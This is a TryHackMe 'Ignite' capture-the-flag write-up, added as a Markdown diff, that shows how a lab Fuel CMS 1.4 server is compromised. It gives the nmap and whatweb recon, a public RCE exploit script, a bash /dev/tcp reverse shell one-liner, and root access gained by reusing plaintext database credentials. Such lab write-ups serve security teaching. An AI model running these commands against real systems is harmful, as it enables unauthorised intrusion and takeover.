@@ -1,0 +1,164 @@
+# 🔥 TryHackMe - Ignite |
+
+
+## 🧠 Summary
+
+This room demonstrates a realistic scenario of exploiting a vulnerable web application (Fuel CMS), gaining initial access through **remote code execution**, and escalating privileges by discovering **hardcoded root credentials** within a configuration file. It’s an excellent example of how **poor security hygiene** and **misconfigured CMS installations** can lead to full system compromise.
+
+
+## 🛰️ 1. Reconnaissance & Enumeration
+
+### 🔎 Nmap Scan
+
+We begin by identifying open ports and services running on the target:
+
+nmap -sC -sV -oN ignite-nmap.txt 10.10.XXX.XXX
+
+
+**Result:**
+
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+```
+
+Only port **80** is open, indicating the system is running a web service.
+
+---
+
+### 🌐 Web Analysis
+
+Browsing to `http://10.10.XXX.XXX` reveals the **default page of Fuel CMS**, a lightweight PHP-based content management system.
+
+To identify the CMS version:
+
+```
+whatweb http://10.10.XXX.XXX
+```
+
+**Output:**
+
+```
+Fuel CMS 1.4
+```
+
+> Fuel CMS v1.4 is known to have a **remote code execution (RCE)** vulnerability via the `/fuel/pages/select` endpoint.
+
+---
+
+## 🎯 2. Exploitation – Remote Code Execution (RCE)
+
+We search for public exploits for Fuel CMS 1.4:
+
+```
+searchsploit fuel cms 1.4
+```
+
+**Found:**
+📄 Exploit Title: *Fuel CMS 1.4 - Remote Code Execution*
+📌 ExploitDB ID: **50477**
+
+### ⬇️ Download the Exploit
+
+```
+searchsploit -m 50477
+```
+
+This gives us `50477.py`, which uses the vulnerable `fuel/pages/select` endpoint to execute system commands via POST request injection.
+
+---
+
+### 🧪 Testing RCE
+
+We verify command execution:
+
+```
+python3 50477.py http://10.10.XXX.XXX whoami
+```
+
+**Output:**
+
+```
+www-data
+```
+
+RCE confirmed. Let’s proceed to gain shell access.
+
+---
+
+## 🐚 3. Gaining Initial Access (Reverse Shell)
+
+### 🧲 Start Netcat Listener
+```
+nc -lvnp 4444
+```
+### 🎯 Execute Reverse Shell Payload
+
+```
+python3 50477.py http://10.10.XXX.XXX "bash -c 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1'"
+```
+
+> Replace `YOUR-IP` with your VPN IP (`tun0`).
+
+✅ We receive a **reverse shell** as user `www-data`.
+
+### 🛠️ Shell Stabilization (Recommended)
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Now we have a **stable interactive shell**.
+
+
+
+## 🔐 4. Privilege Escalation – Root via Exposed Credentials
+
+Our next goal is to escalate privileges to the `root` user.
+
+### 🔍 Search for Configuration Files
+
+Fuel CMS stores its database config in:
+
+```
+/var/www/html/fuel/application/config/database.php
+```
+
+Open the file:
+
+```
+cat /var/www/html/fuel/application/config/database.php
+```
+
+We discover **plaintext MySQL credentials**:
+
+```
+$db['default']['username'] = 'root';
+$db['default']['password'] = 'mememe';
+```
+
+This is a major misconfiguration. Let’s try using this password for system `root`.
+
+---
+
+### 👑 Switch to Root
+```
+su root
+```
+
+When prompted, enter the password found above.
+
+✅ Success — root shell obtained!
+
+
+
+## 🏁 5. Capture the Flags
+
+```
+cat /home/www-data/user.txt
+cat /root/root.txt
+```
+
+Submit both flags to complete the room.
+
+
